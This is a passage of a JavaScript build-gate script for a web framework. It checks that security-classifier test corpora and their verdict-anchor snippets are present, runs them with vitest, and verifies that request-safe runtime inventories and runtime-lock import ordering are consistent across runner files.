          'a reassigned local value binding',
          'a reflectively mutated local value',
          'an aliased local value escape',
          'an opaque local value escape',
          'a private-value conditional condition contains %s',
          'an inline assignment',
          'a private value escapes earlier in the audited sink statement',
          'Object.assign(userId, { value: input.userId })',
        ],
      },
      {
        id: 'server-summary-cannot-launder-attacker-input',
        file: 'packages/drizzle/src/index.mass-assignment.test.ts',
        snippets: [
          'rejects app-declared server provenance for a helper returning attacker input',
          'function resolveOwner(input: { ownerId: string }) { return input.ownerId; }',
          "detail: 'resolveOwner(input)'",
          'keeps declared and plain helper calls unknown',
        ],
      },
      {
        id: 'server-value-requires-positive-non-input-proof',
        file: 'packages/drizzle/src/index.mass-assignment.test.ts',
        snippets: [
          'rejects serverValue when opaque helper flow is not proven non-input',
          'serverValue(opaque(input.role)',
          'serverValue(container.role',
          'rejects serverValue private provenance through a %s value-container write',
          'serverValue(principal.ownerId',
          'rejects serverValue with no value argument',
          "detail: 'serverValue()'",
        ],
      },
      {
        id: 'exact-private-helper-positive-control',
        file: 'packages/drizzle/src/index.columns-keys-predicates-provenance.test.ts',
        snippets: [
          'uses exact structurally verified same-file session helper provenance',
          'return request.session.id;',
          'const existing = await request.db.select({ id: questions.id }).from(questions).where(eq(questions.sessionId, sessionId));',
          "{ kind: 'session', path: 'id' }",
        ],
      },
    ],
  },
];

export function evaluateSecurityClassifierCorpus(options = {}) {
  const root = options.repoRoot ?? repoRoot;
  const corpora = options.corpora ?? REQUIRED_CLASSIFIER_CORPORA;
  const readText =
    options.readText ?? ((relativePath) => readFileSync(path.join(root, relativePath), 'utf8'));
  const run = options.run ?? ((testFiles, runOptions) => runVitest(testFiles, root, runOptions));
  const findings = [];
  const testFiles = [];
  const fileText = new Map();

  if (options.enforceRuntimeInventory ?? options.corpora === undefined) {
    findings.push(...evaluateRequestSafeRuntimeInventoryAlignment(readText));
  }

  for (const corpus of corpora) {
    const markerFiles = [];
    for (const testFile of corpus.testFiles) {
      let text = '';
      try {
        text = readText(testFile);
      } catch {
        findings.push(`${corpus.id}: missing required corpus test file ${testFile}`);
        continue;
      }
      fileText.set(testFile, text);
      testFiles.push(testFile);
      if (text.includes(corpus.marker)) markerFiles.push(testFile);
    }
    if (markerFiles.length === 0) {
      findings.push(`${corpus.id}: no test file contains marker ${JSON.stringify(corpus.marker)}`);
    }
    for (const anchor of corpus.verdictAnchors ?? []) {
      const text = fileText.get(anchor.file);
      if (typeof text !== 'string') continue;
      const missing = anchor.snippets.filter((snippet) => !text.includes(snippet));
      if (missing.length > 0) {
        findings.push(
          `${corpus.id}: missing verdict anchor ${JSON.stringify(anchor.id)} in ${anchor.file}`,
        );
      }
    }
  }

  const uniqueTestFiles = [...new Set(testFiles)];
  const loadIsolatedTestConfigs =
    options.loadIsolatedTestConfigs ??
    (options.corpora === undefined ? LOAD_ISOLATED_TEST_CONFIGS : []);
  for (const config of loadIsolatedTestConfigs) {
    if (!uniqueTestFiles.includes(config.file)) {
      findings.push(`load-isolated corpus file is not enrolled: ${config.file}`);
      continue;
    }
    const text = fileText.get(config.file);
    for (const testName of config.freshTestNames ?? []) {
      if (!text?.includes(testName)) {
        findings.push(`load-isolated corpus test is missing from ${config.file}: ${testName}`);
      }
    }
  }
  if (findings.length === 0) {
    const batches = classifierCorpusTestBatches(uniqueTestFiles, loadIsolatedTestConfigs);
    for (const batch of batches) {
      const result = run(batch.files, {
        noFileParallelism: batch.noFileParallelism,
        testNamePattern: batch.testNamePattern,
      });
      if (!result.ok) findings.push(result.output || 'security classifier corpus vitest failed');
    }
  }

  return {
    corpora: corpora.length,
    findings,
    ok: findings.length === 0,
    testFiles: uniqueTestFiles,
  };
}

function classifierCorpusTestBatches(testFiles, loadIsolatedTestConfigs) {
  const configByFile = new Map(loadIsolatedTestConfigs.map((config) => [config.file, config]));
  const ordinaryTestFiles = testFiles.filter((file) => !configByFile.has(file));
  const batches =
    ordinaryTestFiles.length > 0
      ? [{ files: ordinaryTestFiles, noFileParallelism: false, testNamePattern: undefined }]
      : [];

  for (const file of testFiles) {
    const config = configByFile.get(file);
    if (config === undefined) continue;
    const freshTestNames = config.freshTestNames ?? [];
    if (freshTestNames.length === 0) {
      batches.push({ files: [file], noFileParallelism: true, testNamePattern: undefined });
      continue;
    }
    const freshPattern = freshTestNames.map(escapeRegex).join('|');
    batches.push({
      files: [file],
      noFileParallelism: true,
      testNamePattern: `^(?!.*(?:${freshPattern})).*$`,
    });
    for (const testName of freshTestNames) {
      batches.push({
        files: [file],
        noFileParallelism: true,
        testNamePattern: escapeRegex(testName),
      });
    }
  }
  return batches;
}

function escapeRegex(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&');
}

/**
 * Keep classifier-safe names within the exact bootstrap-locked inventory (SPEC §6.6 rule 6).
 * This reads source declarations instead of importing TypeScript through the plain-Node gate.
 */
export function evaluateRequestSafeRuntimeInventoryAlignment(readText) {
  let inventorySource;
  let classifierSource;
  try {
    inventorySource = readText(REQUEST_SAFE_RUNTIME_INVENTORY_FILE);
  } catch {
    return [`request-safe-runtime: missing ${REQUEST_SAFE_RUNTIME_INVENTORY_FILE}`];
  }
  try {
    classifierSource = readText(REQUEST_PROCESS_CLASSIFIER_FILE);
  } catch {
    return [`request-safe-runtime: missing ${REQUEST_PROCESS_CLASSIFIER_FILE}`];
  }

  const findings = [];
  for (const [inventoryName, classifierName] of REQUEST_SAFE_RUNTIME_SET_ALIGNMENT) {
    const locked = sourceStringArray(inventorySource, inventoryName);
    const classified = sourceStringArray(classifierSource, classifierName);
    if (locked === undefined) {
      findings.push(`request-safe-runtime: cannot read locked inventory ${inventoryName}`);
      continue;
    }
    if (classified === undefined) {
      findings.push(`request-safe-runtime: cannot read classifier set ${classifierName}`);
      continue;
    }
    const lockedNames = new Set(locked);
    const excess = [...new Set(classified)].filter((name) => !lockedNames.has(name)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: ${classifierName} exceeds ${inventoryName}: ${excess.join(', ')}`,
      );
    }
  }

  const classifiedBuiltins = sourceStringArray(classifierSource, 'REQUEST_SAFE_BUILTIN_MODULES');
  if (classifiedBuiltins === undefined) {
    findings.push('request-safe-runtime: cannot read classifier set REQUEST_SAFE_BUILTIN_MODULES');
  } else if (classifiedBuiltins.length > 0) {
    findings.push(
      `request-safe-runtime: REQUEST_SAFE_BUILTIN_MODULES must remain empty: ${[...new Set(classifiedBuiltins)].sort().join(', ')}`,
    );
  }

  const lockedNamespaceMembers = sourceStringArray(
    inventorySource,
    'requestSafeGlobalNamespaceMemberPaths',
  );
  const classifiedNamespaceMembers = sourceReviewedGlobalNamespaceMembers(classifierSource);
  if (lockedNamespaceMembers === undefined || classifiedNamespaceMembers === undefined) {
    findings.push(
      'request-safe-runtime: cannot read the reviewed global namespace member inventory',
    );
  } else {
    const locked = new Set(lockedNamespaceMembers);
    const classified = new Set(classifiedNamespaceMembers);
    const excess = [...classified].filter((path) => !locked.has(path)).sort();
    const stale = [...locked].filter((path) => !classified.has(path)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS exceeds requestSafeGlobalNamespaceMemberPaths: ${excess.join(', ')}`,
      );
    }
    if (stale.length > 0) {
      findings.push(
        `request-safe-runtime: requestSafeGlobalNamespaceMemberPaths exceeds REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS: ${stale.join(', ')}`,
      );
    }
  }

  const callbackInventory = sourceStringArray(inventorySource, 'requestSafeCallbackGlobals');
  const callbackClassifier = sourceStringArray(classifierSource, 'callbackGlobal of');
  if (callbackInventory === undefined || callbackClassifier === undefined) {
    findings.push('request-safe-runtime: cannot read the reviewed callback-global inventory');
  } else {
    const lockedNames = new Set(callbackInventory);
    const excess = [...new Set(callbackClassifier)].filter((name) => !lockedNames.has(name)).sort();
    if (excess.length > 0) {
      findings.push(
        `request-safe-runtime: callback globals exceed requestSafeCallbackGlobals: ${excess.join(', ')}`,
      );
    }
  }

  const governedGlobals = sourceStringArray(inventorySource, 'requestGovernedGlobalBindings');
  if (governedGlobals === undefined) {
    findings.push('request-safe-runtime: cannot read the governed global inventory');
  } else {
    const governed = [...new Set(governedGlobals)].sort();
    if (governed.length !== 1 || governed[0] !== 'fetch') {
      findings.push(
        `request-safe-runtime: requestGovernedGlobalBindings must contain exactly fetch: ${governed.join(', ')}`,
      );
    }
  }
  if (!classifierSource.includes("expressionResolvesToGlobalCallable(node, 'fetch'")) {
    findings.push('request-safe-runtime: classifier is missing the governed direct-fetch rule');
  }

  for (const requiredLockReference of [
    'appendUniqueNames(inventory.globalCallables',
    'appendUniqueNames(inventory.globalNamespaces',
    'appendUniqueNames(inventory.globalConstructors',
    'appendUniqueNames(inventory.callbackGlobals',
    'appendUniqueNames(inventory.governedGlobals',
    'inventory.globalNamespaceMemberPaths',
  ]) {
    if (!inventorySource.includes(requiredLockReference)) {
      findings.push(`request-safe-runtime: global lock is missing ${requiredLockReference}`);
    }
  }

  const requiredRunnerReferences = {
    cliHandler: [
      'createRequestHandler, deriveClosedKovoApp, runWithGeneratedLiveTargetRegistry',
      'runWithGeneratedLiveTargetRegistry',
    ],
    compiler: ['lockRequestSafeRuntimeRealm();'],
    generatedPresets: [
      'lockRequestSafeRuntimeRealmWithInventory',
      'lockRequestSafeRuntimeRealm(${generatedRequestSafeRuntimeInventorySource});',
    ],
    requestHandler: ['assertServerRequestSafeRuntimeRealmLocked();'],
    runtimeBootstrap: ['lockServerRequestSafeRuntimeRealm();'],
  };
  for (const [runner, file] of Object.entries(REQUEST_SAFE_RUNTIME_RUNNER_FILES)) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    for (const reference of requiredRunnerReferences[runner]) {
      if (!source.includes(reference)) {
        findings.push(`request-safe-runtime: ${file} is missing ${reference}`);
      }
    }
  }
  findings.push(...evaluateCustomRunnerBootstrapOrdering(readText));
  return findings;
}

/** Keep reusable framework-owned app shells raw and custom-runner docs bootstrap-first. */
export function evaluateCustomRunnerBootstrapOrdering(readText) {
  const findings = [];
  for (const file of CUSTOM_REQUEST_HANDLER_ENTRY_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (
      !source.includes('createRequestHandler') ||
      source.includes('@kovojs/server/internal/app-shell-vite')
    ) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded request handler behind its supported runner`,
      );
    }
  }
  for (const file of PACKED_REQUEST_HANDLER_RUNNER_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('createRequestHandler')) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded request handler behind its supported runner`,
      );
    }
    const firstImport = source.split('\n').find((line) => line.trimStart().startsWith('import '));
    if (firstImport?.trim() !== PACKED_RUNTIME_BOOTSTRAP_IMPORT) {
      findings.push(
        `request-safe-runtime: ${file} must start imports with ${PACKED_RUNTIME_BOOTSTRAP_IMPORT}`,
      );
    }
    if (/(?:from\s+|import\(\s*)['"]playwright['"]/u.test(source)) {
      findings.push(
        `request-safe-runtime: ${file} must isolate Playwright from the locked request-serving realm`,
      );
    }
    if (!source.includes("new Worker(new URL('./p10-perf-browser-worker.mjs'")) {
      findings.push(
        `request-safe-runtime: ${file} must run the Playwright client in its isolated worker realm`,
      );
    }
  }
  for (const file of PACKED_STATIC_EXPORT_RUNNER_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('exportStaticApp')) {
      findings.push(
        `request-safe-runtime: ${file} must keep the public guarded static exporter behind its supported runner`,
      );
    }
    const firstImport = source.split('\n').find((line) => line.trimStart().startsWith('import '));
    if (firstImport?.trim() !== PACKED_RUNTIME_BOOTSTRAP_IMPORT) {
      findings.push(
        `request-safe-runtime: ${file} must start imports with ${PACKED_RUNTIME_BOOTSTRAP_IMPORT}`,
      );
    }
  }

  let rootPackConfigSource;
  try {
    rootPackConfigSource = readText(ROOT_PACK_CONFIG_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${ROOT_PACK_CONFIG_FILE}`);
  }
  if (
    rootPackConfigSource !== undefined &&
    !rootPackConfigSource.includes("'packages/server/src/runtime-bootstrap.ts'")
  ) {
    findings.push(
      `request-safe-runtime: ${ROOT_PACK_CONFIG_FILE} root pack must emit packages/server/src/runtime-bootstrap.ts`,
    );
  }
  for (const file of SECURITY_LOCKED_SCRIPT_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('createSecurityLockedViteServer')) {
      findings.push(`request-safe-runtime: ${file} must use the compiler-first locked Vite runner`);
    }
    if (file === COMPILER_DETERMINISM_RUNNER_FILE) {
      if (
        /\bcreateServer\b/u.test(source) ||
        /(?:from\s+|import\(\s*)['"]vite(?:-plus)?['"]/u.test(source) ||
        /['"][^'"]*\/vite\/dist\//u.test(source)
      ) {
        findings.push(
          `request-safe-runtime: ${file} must not construct Vite outside the compiler-first locked runner`,
        );
      }
      const lockIndex = source.indexOf('createSecurityLockedViteServer(');
      const corpusIndex = source.indexOf("server.ssrLoadModule('/tests/compiler-perf-corpora.ts')");
      const compilerIndex = source.indexOf(
        "server.ssrLoadModule('/packages/compiler/src/index.ts')",
      );
      if (lockIndex < 0 || corpusIndex <= lockIndex || compilerIndex <= corpusIndex) {
        findings.push(
          `request-safe-runtime: ${file} must lock Vite before loading compiler corpora and compiler source`,
        );
      }
    }
  }
  for (const file of SECURITY_LOCKED_NESTED_VITE_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const assertionIndex = source.indexOf('assertRequestSafeRuntimeRealmLocked();');
    const artifactIndex = source.indexOf('ensureGalleryInteractiveServerArtifacts();');
    const createIndex = source.indexOf('createViteServer({');
    if (
      !source.includes("from 'vite-plus'") ||
      assertionIndex < 0 ||
      artifactIndex < 0 ||
      createIndex < 0 ||
      assertionIndex >= artifactIndex ||
      assertionIndex >= createIndex
    ) {
      findings.push(
        `request-safe-runtime: ${file} must assert the established runtime lock before compiler work and nested Vite creation`,
      );
    }
    if (source.includes('secure-vite-runtime.mjs') || source.includes('registerHooks')) {
      findings.push(
        `request-safe-runtime: ${file} must reuse the established Vite runtime without requesting loader hooks`,
      );
    }
  }
  let secureViteBuildRunnerSource;
  try {
    secureViteBuildRunnerSource = readText(SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE}`);
  }
  if (
    secureViteBuildRunnerSource !== undefined &&
    !secureViteBuildRunnerSource.includes('buildWithSecurityLockedVite')
  ) {
    findings.push(
      `request-safe-runtime: ${SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE} must use the compiler-first locked Vite build runner`,
    );
  }
  for (const file of SECURITY_LOCKED_IN_PROCESS_BUILD_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes('buildWithSecurityLockedVite')) {
      findings.push(`request-safe-runtime: ${file} must build Vite in its locked process`);
    }
    if (/execFileSync\s*\(\s*['"](?:vp|corepack)['"]/u.test(source)) {
      findings.push(
        `request-safe-runtime: ${file} must not delegate Vite build authority to a child`,
      );
    }
  }
  for (const file of SECURITY_LOCKED_COMPILER_SCRIPT_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const lockIndex = source.indexOf('await securityLockedCompilerRuntime();');
    const compilerImportIndex = source.indexOf("await import('@kovojs/compiler')");
    if (lockIndex < 0 || compilerImportIndex < 0 || lockIndex >= compilerImportIndex) {
      findings.push(
        `request-safe-runtime: ${file} must lock the compiler before importing compiler authority`,
      );
    }
  }
  for (const { file, snippet } of SECURITY_LOCKED_PACKAGE_BUILD_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (!source.includes(snippet)) {
      findings.push(
        `request-safe-runtime: ${file} must route supported Vite builds through the locked build script`,
      );
    }
  }

  let secureViteRunnerSource;
  try {
    secureViteRunnerSource = readText(SECURITY_LOCKED_VITE_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SECURITY_LOCKED_VITE_RUNNER_FILE}`);
  }
  if (secureViteRunnerSource !== undefined) {
    const orderedReferences = [
      "'../../packages/compiler/src/security-bootstrap.ts'",
      'compilerBootstrap.lockCompilerSecurityRealm();',
      "'../../packages/server/src/runtime-bootstrap.ts'",
      "return import('vite-plus');",
    ];
    let priorIndex = -1;
    for (const reference of orderedReferences) {
      const index = secureViteRunnerSource.indexOf(reference);
      if (index < 0 || index <= priorIndex) {
        findings.push(
          `request-safe-runtime: ${SECURITY_LOCKED_VITE_RUNNER_FILE} must lock compiler then server before importing Vite`,
        );
        break;
      }
      priorIndex = index;
    }
    if (/\bfrom\s+['"]vite-plus['"]/u.test(secureViteRunnerSource)) {
      findings.push(
        `request-safe-runtime: ${SECURITY_LOCKED_VITE_RUNNER_FILE} must not statically import Vite`,
      );
    }
  }

  let siteStaticExportSource;
  try {
    siteStaticExportSource = readText(SITE_STATIC_EXPORT_RUNNER_FILE);
  } catch {
    findings.push(`request-safe-runtime: missing ${SITE_STATIC_EXPORT_RUNNER_FILE}`);
  }
  if (siteStaticExportSource !== undefined) {
    const lockIndex = siteStaticExportSource.indexOf('await securityLockedViteRuntime();');
    const cliImportIndex = siteStaticExportSource.indexOf(
      "await import('../../packages/cli/src/commands/build-export.js')",
    );
    if (lockIndex < 0 || cliImportIndex < 0 || lockIndex >= cliImportIndex) {
      findings.push(
        `request-safe-runtime: ${SITE_STATIC_EXPORT_RUNNER_FILE} must lock the runtime before importing the CLI/Vite graph`,
      );
    }
  }

  for (const file of PURE_APP_ENTRY_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    if (source.includes('createRequestHandler')) {
      findings.push(
        `request-safe-runtime: ${file} must export a pure app without a request handler`,
      );
    }
  }
  for (const file of CUSTOM_REQUEST_HANDLER_DOC_FILES) {
    let source;
    try {
      source = readText(file);
    } catch {
      findings.push(`request-safe-runtime: missing ${file}`);
      continue;
    }
    const codeBlocks = source.matchAll(/```(?:ts|tsx)\n([\s\S]*?)```/gu);
    let adapterBlocks = 0;
    let handlerBlocks = 0;
    for (const block of codeBlocks) {
      const code = block[1] ?? '';
      if (code.includes('createRequestHandler')) {
        handlerBlocks += 1;
        if (
          !code.includes('export const handler = createRequestHandler(app);') ||
          code.includes('runtime-bootstrap') ||
          /from\s+['"]node:/u.test(code)
        ) {
          findings.push(
            `request-safe-runtime: ${file} handler block ${handlerBlocks} must export a host-independent createRequestHandler(app) module`,
          );
        }
      }
      if (!code.includes('toNodeHandler')) continue;
      adapterBlocks += 1;
      const firstImport = code.split('\n').find((line) => line.trimStart().startsWith('import '));
      if (
        firstImport?.trim() !== RUNTIME_BOOTSTRAP_IMPORT ||
        !code.includes("from './handler.js'") ||
        !code.includes('toNodeHandler(handler)') ||
        code.includes('createRequestHandler')
      ) {
        findings.push(
          `request-safe-runtime: ${file} adapter block ${adapterBlocks} must be bootstrap-first and import one separated handler`,
        );
      }
    }
    if (handlerBlocks === 0 || adapterBlocks === 0) {
      findings.push(
        `request-safe-runtime: ${file} must document both a host-independent handler and bootstrap-first separated adapter`,
      );
    }
  }
  return findings;
}

function sourceStringArray(source, declarationName) {
  const escapedName = declarationName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const declaredArray = new RegExp(
    `(?:export\\s+)?const\\s+${escapedName}\\s*=[^\\[]*\\[([\\s\\S]*?)\\]`,
    'u',
  ).exec(source);
  const declaration =
    declaredArray ?? new RegExp(`${escapedName}\\s*[^\\[]*\\[([\\s\\S]*?)\\]`, 'u').exec(source);
  if (declaration === null) {
    const emptySet = new RegExp(
      `const\\s+${escapedName}\\s*=\\s*new\\s+Set(?:<[^>]+>)?\\(\\s*\\)`,
      'u',
    );
    return emptySet.test(source) ? [] : undefined;
  }
  const values = [];
  const stringPattern = /(['"])(.*?)\1/gu;
  for (const match of declaration[1].matchAll(stringPattern)) values.push(match[2]);
  return values;
}

function sourceReviewedGlobalNamespaceMembers(source) {
  const start = source.indexOf('const REQUEST_REVIEWED_GLOBAL_NAMESPACE_MEMBERS');
  const end = start < 0 ? -1 : source.indexOf(']);', start);
  if (start < 0 || end < 0) return undefined;
  const block = source.slice(start, end + 3);
  const paths = [];
  const entryPattern =
    /\[\s*(['"])([^'"]+)\1\s*,\s*new Set\(\s*(?:\[([\s\S]*?)\])?\s*\)\s*,?\s*\]/gu;
  for (const entry of block.matchAll(entryPattern)) {
    const memberSource = entry[3] ?? '';
    for (const member of memberSource.matchAll(/(['"])(.*?)\1/gu)) {
      paths.push(`${entry[2]}.${member[2]}`);
    }
  }
  return paths;
}

export function main(options = {}) {
  const result = evaluateSecurityClassifierCorpus(options);
  process.stdout.write(
    `check-security-classifier-corpus/v1 ${result.ok ? 'OK' : 'FAIL'} corpora=${result.corpora}\n`,
  );
  for (const finding of result.findings) process.stderr.write(`${finding}\n`);
  return result.ok;
}

function runVitest(testFiles, root, options = {}) {
  const result = spawnSync(
    'pnpm',
    [
      'exec',
      'vitest',
      '--run',
      ...(options.noFileParallelism ? ['--no-file-parallelism'] : []),
      ...(options.testNamePattern ? ['--testNamePattern', options.testNamePattern] : []),
      ...testFiles,
    ],
    {
      cwd: root,
      encoding: 'utf8',
    },
  );
  return {
    ok: result.status === 0,
    output: `${result.stdout ?? ''}${result.stderr ?? ''}`.trim(),
  };
}

if (isMainEntry(import.meta.url)) await runGate(main);
